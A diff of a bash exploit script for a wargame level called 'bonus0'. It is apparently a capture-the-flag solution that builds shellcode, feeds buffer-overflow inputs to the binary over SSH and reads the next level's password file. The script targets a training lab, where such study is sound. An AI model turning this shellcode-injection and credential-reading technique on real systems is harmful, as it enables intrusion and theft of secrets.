@@ -42,10 +42,6 @@ generate_shellcode() {
 # #### #
 
 main() {
-    host="${host:-localhost}";
-    port="${port:-4242}";
-    username="${username:-bonus0}";
-    password="${password}";
     flag="";
 
     shellcode="$(generate_shellcode)" || { log "Error: failed to build shellcode."; return 1; };
@@ -55,13 +51,13 @@ main() {
     user_input_2="BBBBBBBBB${shellcode_addr}BBBBBBB${shellcode}\n"
 
     log "Authenticating to SSH server at $host:$port with username '$username'...";
-    ssh_initialize_socket "$host" "$port" "$username" "$password" || { log "Error: Failed to initialize SSH socket."; return 1; };
+    SSHPASS="$(sshid_password)" ssh_initialize_socket "$host" "$port" "$username" || { log "Error: Failed to initialize SSH socket." >&2; return 1; };
     flag="$(ssh_exec_via_socket "$host" "$port" "$username" "{ \
         printf '%b' '${user_input_1}'; sleep 1.0; \
         printf '%b' '${user_input_2}'; sleep 1.0; \
         printf '%s\\n' 'cat /home/user/bonus1/.pass'; \
     } | env -i ./bonus0 2>/dev/null")";
-    ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket."; return 1; };
+    ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket." >&2; return 1; };
 
     if [ -z "$flag" ]; then
         log "Error: flag is empty. Something went wrong.";
